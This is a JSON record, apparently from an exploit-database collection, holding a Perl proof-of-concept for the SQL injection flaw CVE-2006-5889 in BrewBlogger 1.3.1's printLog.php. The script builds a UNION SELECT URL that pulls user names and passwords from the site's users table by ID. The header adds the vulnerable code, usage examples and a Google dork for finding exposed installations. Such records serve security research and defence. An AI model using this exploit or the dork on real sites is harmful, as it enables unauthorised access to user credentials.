{
  "id": "2751",
  "title": "BrewBlogger 1.3.1 - &#039;printLog.php&#039; SQL Injection",
  "cve": "CVE-2006-5889",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n###########################################################################################\r\n#Target:\r\n#\r\n#       BewBlogger 1.3.1\r\n#       http://brewblogger.zkdigital.com\r\n#\r\n#Vulnerability:\r\n#\r\n#       SQL Injection\r\n#\r\n#Description:\r\n#\r\n#       BrewBlogger does not properly sanitize the 'id=' parameter passed to printLog.php.\r\n#       Since each user entry contains an auto-incrementing ID number, it is possible to\r\n#       enumerate all user names and passwords stored in the 'users'database by iterating\r\n#       through every possible ID number.\r\n#\r\n#Vulnerable Code (truncated):\r\n#\r\n#       $colname_log = (get_magic_quotes_gpc()) ? $_GET['id'] : addslashes($_GET['id']);\r\n#       $query_log = sprintf(\"SELECT * FROM brewing WHERE id = %s\", $colname_log);\r\n#       $log = mysql_query($query_log, $brewing) or die(mysql_error());\r\n#\r\n#Usage:\r\n#       This script will produce a URL which will reveal the user name and password for\r\n#       the specified ID. If no ID is specified, 2 is used (seems to be the usual ID for\r\n#       the first user). The user name will be listed as \"Method:\" under 'General\r\n#       Information', and the password will be listed as \"Cost:\".\r\n#\r\n#Usage:\r\n#       ./brewblog.pl <domain name + path> [user id]\r\n#\r\n#Examples:\r\n#\r\n#       ./brewblogger.pl www.beerblog.com 3\r\n#       ./brewblogger.pl www.mysite.com/beerblog\r\n#\r\n#Google Dork:\r\n#\r\n#       intext:\"BrewBlogger for PHP\"\r\n#\r\n#Discovery/code:\r\n#\r\n#       Craig Heffner\r\n#       heffnercj [at] gmail.com\r\n#       http://www.craigheffner.com\r\n###########################################################################################\r\n\r\n\r\nprint '\r\n###########################################\r\n# BrewBlogger 1.3.1 SQL Injection Exploit #\r\n#                                         #\r\n# Discovered and coded by: Craig Heffner  #\r\n###########################################\r\n';\r\n\r\nif(!$ARGV[0] || $ARGV[0] eq \"-h\"){\r\n       print \"\\nUsage: ./brewlogger.pl <domain name + path> [user id]\\n\\nSee script comments for more details\\n\";\r\n       exit;\r\n}\r\n\r\n\r\nif(!$ARGV[1]){\r\n       $id = 2;\r\n} else {\r\n       $id = $ARGV[1];\r\n}\r\n\r\n$url = \"http://\" . $ARGV[0] . \"/printLog.php?id=0+UNION+SELECT+\";\r\n$a = 1;\r\n\r\nwhile($a < 211){\r\n       if($a == 8){\r\n               $string .= \"user_name,\";\r\n       } elsif($a == 9){\r\n               $string .= \"password,\";\r\n       } elsif($a == 210){\r\n               $string .= \"1\";\r\n       } else {\r\n               $string .= \"1,\";\r\n       }\r\n       $a++;\r\n}\r\n\r\nprint \"\\n\\nUse the following URL:\\n\\n\" . $url . $string . \"+FROM+users+WHERE+id=\" . $id . \"\\n\";\r\nexit;\r\n\r\n# milw0rm.com [2006-11-10]",
  "url": "https://www.exploit-db.com/exploits/2751"
}